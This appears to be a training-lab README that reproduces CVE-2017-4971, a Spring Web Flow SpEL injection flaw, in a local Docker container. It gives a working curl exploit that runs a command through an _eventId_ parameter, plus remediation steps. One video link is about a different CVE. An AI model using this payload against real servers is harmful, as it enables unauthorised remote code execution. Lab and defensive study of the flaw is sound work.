# Spring Web Flow MvcViewFactoryCreator SpEL Injection RCE (CVE-2017-4971)

## Overview

Spring Web Flow versions prior to 2.4.5 contain a code injection vulnerability. When applications use MvcViewFactoryCreator without configuring binder properties, Spring Web Flow defaults to evaluating incoming HTTP request parameter names starting with _eventId_ as Spring Expression Language (SpEL) expressions, enabling unauthenticated remote code execution.

- **Service Access**: `http://localhost:8169/`
- **Default Credentials**: `Unauthenticated SpEL injection`
- **Docker Shortcut**: `./lab start spring-webflow-rce`
- **Container Name**: `cyberlab_04_spring_webflow_rce`
- **RAM Footprint**: ~300M

---

## Exploitation Walkthrough

### 1. Access Spring Web Flow Booking Application

```bash
curl -i http://localhost:8169/hotels/booking?hotelId=1
```

### 2. Submit Booking Form with SpEL Event Parameter

```bash
curl -i -X POST 'http://localhost:8169/hotels/booking?hotelId=1' \
  -d '_eventId_confirm=&_eventId_test=T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned_webflow")'
```

### 3. Verify File Creation

```bash
docker exec -it cyberlab_04_spring_webflow_rce ls -la /tmp/pwned_webflow
```

---

## Defensive Remediation & Hardening

1. Upgrade Spring Web Flow to version 2.4.5 or higher.
2. Explicitly configure data binding rules on view-state configurations.

---

## Video Walkthroughs & Technical References

- [#spring cloud gateway remote code execution | CVE-2022-22947](https://www.youtube.com/watch?v=mX3MtC6psJA)
- [VMware Spring Security Advisory CVE-2017-4971](https://spring.io/security/cve-2017-4971)
- [Vulhub Spring Web Flow Environment](https://vulhub.org/#/environments/spring/CVE-2017-4971/)
